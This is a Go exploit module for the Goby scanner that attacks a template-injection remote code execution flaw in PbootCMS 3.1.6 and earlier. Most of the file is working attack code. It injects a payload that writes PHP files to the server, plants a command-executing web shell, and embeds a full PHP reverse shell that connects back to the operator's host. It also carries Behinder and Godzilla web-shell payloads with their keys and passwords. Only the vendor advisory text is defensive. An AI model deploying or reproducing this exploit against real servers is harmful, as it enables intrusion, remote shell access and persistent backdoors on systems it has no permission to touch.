package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "PbootCMS ParserController remote code execution vulnerability",
    "Description": "<p>PbootCMS is a brand-new core and permanently open source and free PHP enterprise website development and construction management system. It is a set of efficient, simple and powerful PHP CMS source code that can be used for free and commercially, which can meet the needs of various enterprise website development and construction.</p><p>Template injection exists in PbootCMS v&lt;=3.1.6. An attacker can construct a specific link to exploit this vulnerability, execute arbitrary code, and obtain server permissions.</p>",
    "Product": "PbootCMS",
    "Homepage": "https://www.pbootcms.com/",
    "DisclosureDate": "2022-07-13",
    "Author": "935565080@qq.com",
    "FofaQuery": "banner=\"Set-Cookie: pbootsystem=\" || banner=\"X-Powered-By: PbootCMS\" || header=\"Set-Cookie: pbootsystem=\" || header=\"X-Powered-By: PbootCMS\"",
    "GobyQuery": "banner=\"Set-Cookie: pbootsystem=\" || banner=\"X-Powered-By: PbootCMS\" || header=\"Set-Cookie: pbootsystem=\" || header=\"X-Powered-By: PbootCMS\"",
    "Level": "3",
    "Impact": "<p>Template injection exists in PbootCMS v&lt;=3.1.6. An attacker can construct a specific link to exploit this vulnerability, execute arbitrary code, and obtain server permissions.</p>",
    "Recommendation": "<p>1. The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.pbootcms.com/\">https://www.pbootcms.com/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello.php",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php phpinfo(); ?>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [
        "CNNVD-2022-83605719"
    ],
    "CNVD": [
        "CNVD-2022-88321"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "PbootCMS ParserController 远程代码执行漏洞",
            "Product": "PbootCMS",
            "Description": "<p>PbootCMS是全新内核且永久开源免费的PHP企业网站开发建设管理系统，是一套高效、简洁、 强悍的可免费商用的PHP CMS源码，能够满足各类企业网站开发建设的需要。</p><p>PbootCMS v&lt;=3.1.6版本中存在模板注入，攻击者可构造特定的链接利用该漏洞，执行任意代码，获取服务器权限。</p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.pbootcms.com/\" target=\"_blank\">https://www.pbootcms.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>PbootCMS v&lt;=3.1.6版本中存在模板注入，攻击者可构造特定的链接利用该漏洞，执行任意代码，获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "PbootCMS ParserController remote code execution vulnerability",
            "Product": "PbootCMS",
            "Description": "<p>PbootCMS is a brand-new core and permanently open source and free PHP enterprise website development and construction management system. It is a set of efficient, simple and powerful PHP CMS source code that can be used for free and commercially, which can meet the needs of various enterprise website development and construction.</p><p>Template injection exists in PbootCMS v&lt;=3.1.6. An attacker can construct a specific link to exploit this vulnerability, execute arbitrary code, and obtain server permissions.</p>",
            "Recommendation": "<p>1. The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.pbootcms.com/\" target=\"_blank\">https://www.pbootcms.com/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>Template injection exists in PbootCMS v&lt;=3.1.6. An attacker can construct a specific link to exploit this vulnerability, execute arbitrary code, and obtain server permissions.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-01-17",
    "PocId": "10706"
}`

	filename := goutils.RandomHexString(5) + ".php"
	stringToHex7svbRdfF3ddGfY := func(input string) string {
		return hex.EncodeToString([]byte(input))
	}
	base64Encode7svbRdfF3ddGfY := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	sendPayload7svbRdfF3ddGfY := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/?member/login/aaaaa}" + payload)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	uploadFile7svbRdfF3ddGfY := func(hostInfo *httpclient.FixUrl, content, param string) (*httpclient.HttpResponse, error) {
		checkFileConfig := httpclient.NewGetRequestConfig("/." + filename)
		checkFileConfig.VerifyTls = false
		checkFileConfig.FollowRedirect = false
		// 检查小马是否存在，不存在就创建
		if resp, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); resp == nil && err != nil {
			return nil, err
		} else if resp != nil && resp.StatusCode != 200 {
			payload := "{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/**/function/**/hex2bin/**/as/**/test4;test(test1(test3('file'),'w'),test4(test3('content')));if(true)}{/pboot:if}&file=." + filename + "&content=" + stringToHex7svbRdfF3ddGfY(content)
			if file, err := sendPayload7svbRdfF3ddGfY(hostInfo, payload); file == nil && err != nil {
				return nil, err
			} else if file != nil && file.StatusCode != 200 && !strings.Contains(file.Utf8Html, "&content") {
				return nil, errors.New("漏洞利用失败")
			}
			time.Sleep(2)
			// 文件不存在，重新检查文件是否被创建成功
			if check, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); check == nil && err != nil {
				return nil, err
			} else if check != nil && check.StatusCode != 200 {
				return nil, errors.New("创建文件失败")
			}
		}
		// 文件存在，直接发送
		checkRequestConfig := httpclient.NewGetRequestConfig("/." + filename + param)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			resp, _ := uploadFile7svbRdfF3ddGfY(hostInfo, `<?php system(base64_decode($_REQUEST['poo']));?>`, "?poo="+url.QueryEscape(base64Encode7svbRdfF3ddGfY("echo "+checkStr)))
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				filename = goutils.RandomHexString(8) + ".php"
				cmd := goutils.B2S(ss.Params["cmd"])
				if resp, err := uploadFile7svbRdfF3ddGfY(expResult.HostInfo, `<?php system(base64_decode($_REQUEST['poo']));?>`, "?poo="+url.QueryEscape(base64Encode7svbRdfF3ddGfY(cmd))); resp != nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				filename = goutils.RandomHexString(8) + ".php"
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				reverseCode := `<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '` + addr + `';  
$port = ` + rp + `;     
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> `
				uploadFile7svbRdfF3ddGfY(expResult.HostInfo, reverseCode, "")
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}

			} else if attackType == "webshell" {
				var content string
				webshell := goutils.B2S(ss.Params["webshell"])
				filename = goutils.RandomHexString(8) + ".php"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else {
					content = goutils.B2S(ss.Params["content"])
					filename = goutils.B2S(ss.Params["filename"])
				}
				if resp, err := uploadFile7svbRdfF3ddGfY(expResult.HostInfo, content, ``); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/." + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: php"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
